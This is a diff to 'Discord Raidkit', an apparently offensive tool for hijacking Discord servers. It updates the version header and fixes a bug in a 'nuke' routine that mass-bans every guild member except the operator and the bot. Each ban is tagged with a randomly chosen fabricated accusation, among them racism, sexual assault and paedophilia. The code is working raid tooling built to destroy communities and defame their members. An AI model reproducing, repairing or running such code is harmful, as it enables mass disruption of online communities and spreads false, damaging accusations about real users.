@@ -1,8 +1,8 @@
 """
-Discord Raidkit v2.4.3
+Discord Raidkit v2.4.4
 the-cult-of-integral
 
-Last modified: 2023-04-24 21:08
+Last modified: 2023-11-04 20:58
 """
 
 import asyncio
@@ -468,12 +468,12 @@ class Cmds(commands.Cog):
     async def __nuke(self, guild: discord.Guild, author: discord.Member):
         old_members = guild.members
         results = await asyncio.gather(
-            *[member.ban(reason=random.choice(
+            *[member.ban(reason=random.choice([
                 'Racism', 'Homophobia', 'Transphobia', 'Sexism', 
                 'Ableism', 'Ageism', 'Sexual Harassment', 
                 'Sexual Assault', 'Harassment', 'Stalking', 
                 'Threats', 'Trolling', 'Cyberbullying', 'Bullying', 
-                'Hacking', 'Doxing', 'Paedophillia')
+                'Hacking', 'Doxing', 'Paedophillia'])
             ) for member in guild.members if not (member == author or member == self.bot.user)], 
             return_exceptions=True)
         for result, member in zip(results, old_members):
